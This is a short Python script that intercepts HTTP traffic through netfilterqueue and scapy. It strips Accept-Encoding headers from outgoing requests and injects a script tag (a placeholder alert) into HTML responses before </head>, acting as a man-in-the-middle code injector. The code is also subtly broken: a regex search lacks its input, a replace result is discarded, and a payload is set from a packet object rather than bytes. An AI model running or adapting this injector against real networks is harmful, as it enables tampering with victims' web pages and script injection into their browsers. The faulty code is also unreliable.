import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(bytes(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            injection_code = b"<script>alert('test')</script>"
            injection_code_len = len(injection_code)
            modified_load = scapy_packet[scapy.Raw].load.replace(b"</head>", injection_code + b"</head>")
            content_length_search = re.search(b"(?:Content-Length:\s)(\d*)")
            if content_length_search:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + injection_code_len
                new_content_length = b"%d" %(new_content_length)
                modified_load.replace(content_length, new_content_length)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(new_packet)
    packet.accept()




queue = netfilterqueue.NetfilterQueue()

#0 is the queue number mentionned in iptables command
queue.bind(0, process_packet)

queue.run()